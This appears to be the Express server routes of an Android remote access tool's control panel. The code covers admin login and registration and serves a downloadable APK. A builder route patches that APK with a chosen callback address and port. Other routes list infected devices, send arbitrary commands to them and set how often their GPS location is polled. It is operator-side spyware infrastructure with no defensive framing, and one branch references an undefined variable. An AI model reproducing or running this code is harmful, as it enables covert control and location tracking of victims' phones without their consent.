const
    express = require('express'),
    routes = express.Router(),
    cookieParser = require('cookie-parser'),
    bodyParser = require('body-parser'),
    bcrypt = require('bcrypt'),
    { createToken } = require('../middlewares/auth.jwt'),
    { verifyToken } = require('../middlewares/auth.jwt');

let CONST = global.CONST;
let db = global.db;
let logManager = global.logManager;
let app = global.app;
let clientManager = global.clientManager;
let apkBuilder = global.apkBuilder;

app.use(cookieParser());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

routes.get('/dl', (req, res) => {
    res.redirect('/build.s.apk');
});

routes.get('/', verifyToken, (req, res) => {
    res.render('index', {
        clientsOnline: clientManager.getClientListOnline(),
        clientsOffline: clientManager.getClientListOffline()
    });
});


routes.get('/register', (req, res) => {
    const register = db.maindb.get('admin').get('register').value();
    if (register !== false) {
        res.render('register');
    } else {
        res.redirect('/login');
    }
}).post('/register', async (req, res) => {
    const register = db.maindb.get('admin').get('register').value();
    try {
        if(register !== false) {
            const { username, password } = req.body;
            const hashedPassword = await bcrypt.hash(password, 10);
            db.maindb.get('admin').assign({ username, password: hashedPassword }).write();
            db.maindb.get('admin').assign({ register: false }).write();
            res.redirect('/login');
        } else {
            res.json({
                success: false,
                message: 'Registration is disabled'
            });
            return;
        }
    }
     catch (err) {
        res.json({
            success: false,
            message: err.message,
        });
    }
})

routes.get('/login', (req, res) => {
    res.render('login');
}).post('/login', async (req, res) => {
    try {
        const { username, password } = req.body;
        user = db.maindb.get('admin.username').value();
        pass = db.maindb.get('admin.password').value();
        if (!user || user !== username) {
          res.redirect('/login?e=badLogin');
        } else {
          const isValid = await bcrypt.compare(password, pass);
          if (isValid) {
            const token = createToken(user);
            res.cookie('x-access-token', token, { httpOnly: true }).redirect('/');
          } else {
            res.json({
              success: false,
              message: 'Invalid password',
            });
          }
        }
      } catch (err) {
        res.json({
          success: false,
          message: err.message,
        });
      }
});

routes.get('/logout', verifyToken, (req, res) => {
    res.clearCookie('x-access-token');
    res.redirect('/login');
});


routes.get('/builder', verifyToken, (req, res) => {
    res.render('builder', {
        myPort: CONST.control_port
    });
});

routes.post('/builder', verifyToken, (req, res) => {
    if ((req.query.uri !== undefined) && (req.query.port !== undefined)) apkBuilder.patchAPK(req.query.uri, req.query.port, (error) => {
        if (!error) apkBuilder.buildAPK((error) => {
            if (!error) {
                logManager.log(CONST.logTypes.success, "Build Succeded!");
                res.json({ error: false });
            }
            else {
                logManager.log(CONST.logTypes.error, "Build Failed - " + error);
                res.json({ error });
            }
        });
        else {
            logManager.log(CONST.logTypes.error, "Build Failed - " + error);
            res.json({ error });
        }
    });
    else {
        logManager.log(CONST.logTypes.error, "Build Failed - " + error);
        res.json({ error });
    }
});


routes.get('/logs', verifyToken, (req, res) => {
    res.render('logs', {
        logs: logManager.getLogs()
    });
});



routes.get('/manage/:deviceid/:page', verifyToken, (req, res) => {
    let pageData = clientManager.getClientDataByPage(req.params.deviceid, req.params.page, req.query.filter);
    if (pageData) res.render('deviceManager', {
        page: req.params.page,
        deviceID: req.params.deviceid,
        baseURL: '/manage/' + req.params.deviceid,
        pageData
    });
    else res.render('deviceManager', {
        page: 'notFound',
        deviceID: req.params.deviceid,
        baseURL: '/manage/' + req.params.deviceid
    });
});

routes.post('/manage/:deviceid/:commandID', verifyToken, (req, res) => {
    clientManager.sendCommand(req.params.deviceid, req.params.commandID, req.query, (error, message) => {
        if (!error) res.json({ error: false, message })
        else res.json({ error })
    });
});

routes.post('/manage/:deviceid/GPSPOLL/:speed', verifyToken, (req, res) => {
    clientManager.setGpsPollSpeed(req.params.deviceid, parseInt(req.params.speed), (error) => {
        if (!error) res.json({ error: false })
        else res.json({ error })
    });
});

module.exports = routes;
